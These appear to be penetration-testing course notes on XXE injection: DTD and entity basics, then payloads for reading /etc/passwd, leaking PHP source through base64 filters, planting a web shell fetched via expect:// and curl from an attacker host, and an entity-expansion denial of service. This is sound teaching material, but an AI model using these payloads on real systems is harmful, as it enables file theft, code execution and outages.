# XML External Entity (XXE) Injection
- [XML DTD](#xml-dtd)
- [XML Entities](#xml-entities)
- [Exploitation](#exploitation)

## XML DTD
- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.
- Example: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
- The following is an example DTD for the XML document :
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
- The DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. 
- After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).

- The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
-------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

## XML Entities
- We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
- Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. 

> [!TIP]
> We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en").



> [!TIP]
> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm).If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.



## Exploitation
### Local File Disclosure

- **Reading Sensitive Files**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
``` 

> [!TIP]
> In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

- **Reading Source Cod**e
    - If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. 
    - Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
    - Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format.
    ```xml
    <!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>
    ```

> [!IMPORTANT]
> This trick only works with PHP web applications.

- **Remote Code Execution**
    - This exploit requires the PHP expect module to be installed and enabled.
    - If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output
    - However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
    ```bash
    echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
    sudo python3 -m http.server 80
    ```
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
    ]>
    <root>
    <name></name>
    <tel></tel>
    <email>&company;</email>
    <message></message>
    </root>
    ```

> [!NOTE]
> We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

- **DOS attack**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```